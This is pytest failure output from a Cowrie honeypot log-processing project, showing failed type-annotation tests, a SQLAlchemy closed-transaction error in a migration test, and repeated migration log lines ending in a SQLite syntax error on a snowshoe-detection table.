    def test_read_spur_data_type_annotations(self) -> None:
        """Test that read_spur_data has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(read_spur_data)
    
        # Test function signature
        import inspect
        sig = inspect.signature(read_spur_data)
        assert len(sig.parameters) == 1
        assert sig.parameters['ip_address'].annotation == str
>       assert sig.return_annotation == dict
E       assert typing.Dict[str, typing.Any] == dict
E        +  where typing.Dict[str, typing.Any] = <Signature (ip_address: str) -> Dict[str, Any]>.return_annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:326: AssertionError
__________ TestProcessCowrieTypes.test_read_vt_data_type_annotations ___________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b32c2a30>

    def test_read_vt_data_type_annotations(self) -> None:
        """Test that read_vt_data has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(read_vt_data)
    
        # Test function signature
        import inspect
        sig = inspect.signature(read_vt_data)
        assert len(sig.parameters) == 2
        assert sig.parameters['hash'].annotation == str
        assert sig.parameters['cache_dir'].annotation == Path
>       assert sig.return_annotation == tuple
E       assert tuple[typing.Optional[str], typing.Optional[str], typing.Optional[str], typing.Optional[bool]] == tuple
E        +  where tuple[typing.Optional[str], typing.Optional[str], typing.Optional[str], typing.Optional[bool]] = <Signature (hash: str, cache_dir: pathlib._local.Path) -> tuple[typing.Optional[str], typing.Optional[str], typing.Optional[str], typing.Optional[bool]]>.return_annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:342: AssertionError
_______ TestProcessCowrieTypes.test_print_session_info_type_annotations ________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b32c2c10>

    def test_print_session_info_type_annotations(self) -> None:
        """Test that print_session_info has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(print_session_info)
    
        # Test function signature
        import inspect
        sig = inspect.signature(print_session_info)
        assert len(sig.parameters) == 5
>       assert sig.parameters['data'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "data: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:356: AssertionError
__________ TestProcessCowrieTypes.test_get_commands_type_annotations ___________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b3cb1640>

    def test_get_commands_type_annotations(self) -> None:
        """Test that get_commands has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(get_commands)
    
        # Test function signature
        import inspect
        sig = inspect.signature(get_commands)
        assert len(sig.parameters) == 2
>       assert sig.parameters['data'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "data: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:375: AssertionError
________ TestProcessCowrieTypes.test_evaluate_sessions_type_annotations ________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b2fe66d0>

    def test_evaluate_sessions_type_annotations(self) -> None:
        """Test that evaluate_sessions has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(evaluate_sessions)
    
        # Test function signature
        import inspect
        sig = inspect.signature(evaluate_sessions)
        assert len(sig.parameters) == 1
>       assert sig.parameters['target_sessions'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "target_sessions: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:391: AssertionError
___________ TestProcessCowrieTypes.test_no_deprecated_query_patterns ___________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b366c1a0>

    def test_no_deprecated_query_patterns(self) -> None:
        """Test that no deprecated SQLAlchemy query patterns are used."""
        # This test ensures we're using proper SQLAlchemy 2.0 patterns
        import os
    
        # Read the source file and check for deprecated patterns
        current_dir = os.path.dirname(os.path.abspath(__file__))
        source_file = os.path.join(current_dir, '..', '..', 'process_cowrie.py')
    
        with open(source_file, 'r') as f:
            content = f.read()
    
        # Check that no deprecated patterns are used
        assert 'session.query(' not in content, "Found deprecated session.query() pattern"
        assert '.query(' not in content, "Found deprecated .query() pattern"
    
        # Check that proper imports are used
>       assert 'from sqlalchemy import' in content, "Should import from sqlalchemy"
E       AssertionError: Should import from sqlalchemy
E       assert 'from sqlalchemy import' in '"""Process and summarize Cowrie honeypot logs with enrichments.\n\nThis script ingests Cowrie JSON logs and produces ...pdate\nwrite_status(state=\'complete\', total_files=total_files, processed_files=processed_files, current_file=\'\')\n'

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:425: AssertionError
___ TestQuarantinePayloadFix.test_malformed_json_has_content_in_dead_letters ___

self = <test_quarantine_payload_fix.TestQuarantinePayloadFix object at 0x7756b32b1e50>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_malformed_json_has_conten0')

    def test_malformed_json_has_content_in_dead_letters(self, tmp_path: Path) -> None:
        """Test that malformed JSON creates dead letter events with content."""
        # Create a file with malformed JSON
        source = tmp_path / "malformed.json"
        with source.open("w", encoding="utf-8") as fh:
            fh.write('{"incomplete": json\n')
            fh.write('malformed line\n')
            fh.write('{"valid": "json"}\n')
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_quarantine_payload_fix.py:44: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_quarantine_payload_fix.py:28: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77566d90f230>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:38,781:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:38,781:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
2025-10-18 18:32:38,781:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:38,781:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:38,781:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:38,781:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:38,781:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:38,781:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:38,781:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:38,781:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:38,783:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:38,783:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
2025-10-18 18:32:38,783:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:38,783:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:38,783:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:38,783:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:38,783:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:38,783:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:38,783:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:38,783:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:38,791:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:38,791:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:38,791:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:38,791:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:38,791:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:38,791:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:38,791:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:38,791:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:38,791:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:38,791:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:38,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:38,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:38,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:38,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:38,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:38,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:38,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:38,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:38,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:38,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:38,796:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:38,796:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:38,796:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:38,796:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:38,796:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:38,796:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:38,796:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:38,796:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:38,796:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:38,796:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:38,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:38,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:38,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:38,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:38,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:38,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:38,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:38,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:38,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:38,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:38,802:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:38,802:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:38,802:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:38,802:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:38,802:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:38,802:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:38,802:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:38,802:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:38,802:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:38,802:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:38,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:38,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:38,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:38,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:38,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:38,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:38,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:38,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:38,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:38,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:38,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:38,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:38,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:38,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:38,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:38,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:38,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:38,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:38,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:38,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:38,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:38,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:38,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:38,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:38,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:38,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:38,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:38,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:38,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:38,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:38,810:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:38,810:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:38,810:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:38,810:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:38,810:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:38,810:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:38,810:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:38,810:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:38,810:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:38,810:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:38,814:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:38,814:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:38,814:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:38,814:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:38,814:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:38,814:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:38,814:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:38,814:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:38,814:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:38,814:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:38,815:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
